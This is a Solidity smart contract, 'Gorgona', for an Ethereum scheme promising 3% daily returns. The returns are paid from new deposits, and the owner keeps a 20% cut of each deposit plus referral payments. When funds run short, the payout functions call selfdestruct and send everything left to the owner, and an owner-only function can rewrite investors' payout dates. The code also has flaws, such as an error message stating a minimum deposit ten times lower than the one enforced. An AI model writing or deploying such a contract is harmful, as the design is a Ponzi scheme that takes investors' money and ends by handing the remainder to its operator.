1 pragma solidity ^0.4.24;
2 
3 contract Gorgona {
4     address public owner;
5 
6     uint constant PAYOUT_PER_INVESTOR_INTERVAL = 10 minutes;
7     uint constant INTEREST = 3;
8     uint private PAYOUT_CUMULATIVE_INTERVAL = 10 minutes;
9     uint private MINIMUM_INVEST = 10000000000000000 wei;
10 
11     uint depositAmount;
12     uint investorCount;
13     uint public payoutDate;
14 
15     struct investor
16     {
17         uint id;
18         uint deposit;
19         uint deposits;
20         uint date;
21         address referrer;
22     }
23 
24     address[] public addresses;
25 
26     mapping(address => investor) public investors;
27 
28     event Invest(address addr, uint amount);
29     event PayoutCumulative(uint amount, uint txs);
30     event PayoutSelf(address addr, uint amount);
31     event RefFee(address addr, uint amount);
32     event Cashback(address addr, uint amount);
33 
34     modifier onlyOwner {if (msg.sender == owner) _;}
35 
36     constructor() public {
37         owner = msg.sender;
38         addresses.length = 1;
39         payoutDate = now;
40     }
41 
42     function() payable public {
43         if (msg.value == 0) {
44             return;
45         }
46 
47         require(msg.value >= MINIMUM_INVEST, "Too small amount, minimum 0.001 ether");
48 
49         investor storage user = investors[msg.sender];
50 
51         if (user.id == 0) {
52             user.id = addresses.length;
53             addresses.push(msg.sender);
54             addresses.length++;
55             investorCount ++;
56 
57             // referrer
58             address referrer = bytesToAddress(msg.data);
59             if (investors[referrer].deposit > 0 && referrer != msg.sender) {
60                 user.referrer = referrer;
61             }
62         }
63 
64         // save investor
65         user.deposit += msg.value;
66         user.deposits += 1;
67         user.date = now;
68 
69         emit Invest(msg.sender, msg.value);
70         depositAmount += msg.value;
71 
72         // project fee
73         owner.transfer(msg.value / 5);
74 
75         // referrer commission for all deposits
76         if (user.referrer > 0x0) {
77             uint bonusAmount = (msg.value / 100) * INTEREST;
78             user.referrer.transfer(bonusAmount);
79             emit RefFee(user.referrer, bonusAmount);
80 
81             // cashback only for first deposit
82             if (user.deposits == 1) {
83                 msg.sender.transfer(bonusAmount);
84                 emit Cashback(msg.sender, bonusAmount);
85             }
86         }
87     }
88 
89     function payout(uint limit) public
90     {
91         require(now >= payoutDate + PAYOUT_CUMULATIVE_INTERVAL, "too fast payout request");
92 
93         uint investorsPayout;
94         uint txs;
95         uint amount;
96 
97         for (uint idx = addresses.length - 1; --idx >= 1;)
98         {
99             address addr = addresses[idx];
100             if (investors[addr].date + 24 hours > now) {
101                 continue;
102             }
103 
104             amount = getInvestorUnPaidAmount(addr);
105             investors[addr].date = now;
106 
107             if (address(this).balance < amount) {
108                 selfdestruct(owner);
109                 return;
110             }
111 
112             addr.transfer(amount);
113 
114             investorsPayout += amount;
115             if (++txs >= limit) {
116                 break;
117             }
118         }
119 
120         payoutDate = now;
121         emit PayoutCumulative(investorsPayout, txs);
122     }
123 
124     function payoutSelf(address addr) public
125     {
126         require(addr == msg.sender, "You need specify your ETH address");
127 
128         require(investors[addr].deposit > 0, "deposit not found");
129         require(now >= investors[addr].date + PAYOUT_PER_INVESTOR_INTERVAL, "too fast payment required");
130 
131         uint amount = getInvestorUnPaidAmount(addr);
132         require(amount >= 1 finney, "too small unpaid amount");
133 
134         investors[addr].date = now;
135         if (address(this).balance < amount) {
136             selfdestruct(owner);
137             return;
138         }
139 
140         addr.transfer(amount);
141 
142         emit PayoutSelf(addr, amount);
143     }
144 
145     function getInvestorDeposit(address addr) public view returns (uint) {
146         return investors[addr].deposit;
147     }
148 
149     function getInvestorCount() public view returns (uint) {
150         return investorCount;
151     }
152 
153     function getDepositAmount() public view returns (uint) {
154         return depositAmount;
155     }
156 
157     function getInvestorDatePayout(address addr) public view returns (uint) {
158         return investors[addr].date;
159     }
160 
161     function getPayoutCumulativeInterval() public view returns (uint)
162     {
163         return PAYOUT_CUMULATIVE_INTERVAL;
164     }
165 
166     function setDatePayout(address addr, uint date) onlyOwner public
167     {
168         investors[addr].date = date;
169     }
170 
171     function setPayoutCumulativeInterval(uint interval) onlyOwner public
172     {
173         PAYOUT_CUMULATIVE_INTERVAL = interval;
174     }
175 
176     function getInvestorUnPaidAmount(address addr) public view returns (uint)
177     {
178         return (((investors[addr].deposit / 100) * INTEREST) / 100) * ((now - investors[addr].date) * 100) / 1 days;
179     }
180 
181     function bytesToAddress(bytes bys) private pure returns (address addr) {
182         assembly {
183             addr := mload(add(bys, 20))
184         }
185     }
186 }